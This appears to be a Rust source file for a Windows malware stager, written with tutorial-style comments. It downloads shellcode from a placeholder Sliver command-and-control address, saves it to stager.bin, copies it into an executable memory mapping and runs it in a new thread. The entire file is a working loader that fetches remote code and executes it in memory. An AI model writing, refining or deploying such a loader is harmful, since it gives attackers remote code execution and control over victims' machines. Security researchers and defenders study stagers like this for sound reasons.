use reqwest::blocking;
use std::fs::{File, OpenOptions};
use std::{io, io::Read, ptr};
use windows::Win32::Foundation::INVALID_HANDLE_VALUE;
use windows::Win32::System::Memory::*;
use windows_sys::Win32::System::Threading::{CreateThread, INFINITE, WaitForSingleObject};

fn main() {
    let mut _file = match download() // Call the download function and match on the result
    {
        Ok(file) => file, // If the download was successful, return the file handle
        Err(e) => {
            eprintln!("Download failed: {}", e);
            std::process::exit(1);
        }
    };

    let mut _shellcode = match bin_to_byte(_file) // Call the bin_to_byte function and match on the result
    {
        Ok(shellcode) => shellcode, // If the conversion was successful, return the shellcode as a byte array
        Err(e) => {
            eprintln!("Conversion failed: {}", e);
            std::process::exit(1);
        }
    };

    println!(
        "Shellcode downloaded and converted successfully. Length: {} bytes",
        _shellcode.len()
    );

    handle(_shellcode.len(), _shellcode);
}

// Download the remote shellcode and save it to disk.
// Download is going to be over an http connection
fn download() -> Result<File, Box<dyn std::error::Error>> // Return a nothing on success or any type of error on failure. Box puts the error on the heap for a predictable size. dyn is for dynamic as the error is unknown at complie time.
{
    // Use reqwest to download to get the shell code
    let mut _url = blocking::get("SLIVER ADDRESS")?;
    // Create a file to save the shellcode to
    let mut _path = File::create("stager.bin")?;

    io::copy(&mut _url, &mut _path); // Copy the contents of the url to the file. The ? operator will return an error if it occurs, othewise it will continue.

    Ok(_path) // Return the file handle on success
}

// Turn the downloaded shellcode into a byte array that can be executed in memory.
fn bin_to_byte(_file: File) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // returns a vector of 8 bit unsigned integers

    // Due to permissions issues, the file needs to be opened and have read and write set to true. Create shouldn't be needed but I set it just in case
    let _file = OpenOptions::new()
        .read(true)
        .write(true)
        .open("stager.bin")?; // Open the file for reading. The ? operator will return an error if it occurs, otherwise it will continue.   

    // create a buffer to hold the contents. This is a vector of 8 bit unsigned integers, which is the same as a byte array. The buffer will be filled with the contents of the file.
    let mut buffer = Vec::new();

    // Use a buffered reader to read the file into the buffer. This is more efficient than reading the file byte by byte.
    io::BufReader::new(_file).read_to_end(&mut buffer)?;

    // Return the buffer on success
    Ok(buffer)
}

unsafe extern "system" fn start(address: *mut core::ffi::c_void) -> u32 {
    unsafe {
        println!("Address passed through successfully {:?}", address);
        let func: extern "C" fn() = std::mem::transmute(address);
        println!("Transmutation is successful.");
        func();
        0
    }
}

fn handle(byte_size: usize, _shellcode: Vec<u8>) {
    let desired_access = SECTION_MAP_READ.0 | SECTION_MAP_WRITE.0 | SECTION_MAP_EXECUTE.0;
    let allocation_attributes = SEC_COMMIT.0;
    let page_protection = PAGE_EXECUTE_READWRITE;

    let file_mapping = unsafe {
        CreateFileMapping2(
            INVALID_HANDLE_VALUE,
            None,
            desired_access,
            page_protection,
            allocation_attributes,
            byte_size as u64,
            None,
            None,
        )
        .unwrap()
    };

    let map_view = unsafe {
        MapViewOfFile(
            file_mapping,
            FILE_MAP_READ | FILE_MAP_WRITE | FILE_MAP_EXECUTE,
            0,
            0,
            0,
        )
    }
    .Value;

    if map_view.is_null() {
        println!("Map View is null.");
        return;
    }

    unsafe { std::ptr::copy_nonoverlapping(_shellcode.as_ptr(), map_view.cast(), byte_size) };
    
    // Virtual Protect 
    let mut old = PAGE_PROTECTION_FLAGS(0);
    unsafe { VirtualProtect(map_view.cast_const(), byte_size, PAGE_EXECUTE_READ, &mut old) };

    let x = unsafe {
        CreateThread(
            ptr::null(),
            0,
            Some(start),
            map_view.cast::<core::ffi::c_void>(),
            0,
            ptr::null_mut(),
        )
    };

    unsafe { WaitForSingleObject(x, INFINITE) };
    if x.is_null()
    {
        println!("The creation of the thread failed.");
    }
    else 
    {
        println!("The handle for the thread is {:?}", x);
    }
}
